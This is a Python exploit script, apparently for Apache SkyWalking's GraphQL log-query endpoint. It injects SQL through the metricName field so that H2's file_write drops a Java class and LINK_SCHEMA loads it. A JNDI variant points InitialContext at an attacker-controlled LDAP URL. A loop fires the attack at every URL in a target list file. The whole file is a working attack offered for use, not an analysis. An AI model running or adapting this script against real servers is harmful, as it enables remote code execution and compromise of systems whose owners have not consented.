# -*- coding: utf-8 -*
# /usr/bin/python3
# @Author:Firebasky

# https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw
# https://cloud.tencent.com/developer/article/1939867

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0",
                 "Accept": "application/json, text/plain, */*",
                 "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                 "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json;charset=utf-8",
                 "Origin": "http://192.168.18.240:8080", "Connection": "close",
                 "Referer": "http://192.168.18.240:8080/log"}

payload = 'CAFEBABE000000.............'
ClassName = 'Evil'
JndiUrl = 'ldap://0.0.0.0:8888'


def exp(burp0_url):
    burp0_json1 = {"query": "query queryLogs($condition: LogQueryCondition) {\r\n        logs: queryLogs(condition: $condition) {\r\n            data: logs {\r\n                serviceName serviceId serviceInstanceName serviceInstanceId endpointName endpointId traceId timestamp isError statusCode contentType content\r\n            }\r\n            total\r\n        }\r\n    }", "variables": {"condition": {"endpointId": "1", "metricName": "INFORMATION_SCHEMA.USERS union  all select file_write('"+payload+"','"+ClassName+".class'))a where 1=? or 1=? or 1=? --", "paging": {"needTotal": True, "pageNum": 1, "pageSize": 1}, "state": "ALL", "stateCode": "1", "traceId": "1"}}}
    try:
        requests.post(burp0_url, headers=burp0_headers, json=burp0_json1, verify=False, allow_redirects=False, timeout=2)
    except:
        pass
    # 触发
    burp0_json2={"query": "query queryLogs($condition: LogQueryCondition) {\r\n        logs: queryLogs(condition: $condition) {\r\n            data: logs {\r\n                serviceName serviceId serviceInstanceName serviceInstanceId endpointName endpointId traceId timestamp isError statusCode contentType content\r\n            }\r\n            total\r\n        }\r\n    }", "variables": {"condition": {"endpointId": "1", "metricName": "INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','"+ClassName+"','jdbc:h2:./test2','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --", "paging": {"needTotal": True, "pageNum": 1, "pageSize": 1}, "state": "ALL", "stateCode": "1", "traceId": "1"}}}
    try:
        requests.post(burp0_url, headers=burp0_headers, json=burp0_json2, verify=False, allow_redirects=False, timeout=2)
    except:
        pass


def jndi(burp0_url):
    burp0_json = {
        "query": "query queryLogs($condition: LogQueryCondition) {\r\n        logs: queryLogs(condition: $condition) {\r\n            data: logs {\r\n                serviceName serviceId serviceInstanceName serviceInstanceId endpointName endpointId traceId timestamp isError statusCode contentType content\r\n            }\r\n            total\r\n        }\r\n    }",
        "variables": {"condition": {"endpointId": "1",
                                    "metricName": "INFORMATION_SCHEMA.USERS union  all select LINK_SCHEMA('TEST2','javax.naming.InitialContext','"+JndiUrl+"','sa','sa','PUBLIC'))a where 1=? or 1=? or 1=? --",
                                    "paging": {"needTotal": True, "pageNum": 1, "pageSize": 1}, "state": "ALL",
                                    "stateCode": "1", "traceId": "1"}}}
    try:
        requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False, allow_redirects=False, timeout=2)
    except:
        pass


def fileTarget(file):
    with open(file) as url_txt:
        urls = url_txt.readlines()
        for url in urls:
            url = url.replace('\n', '')
            jndi(url+'/graphql')


if __name__ == '__main__':
    fileTarget('vulip.txt')
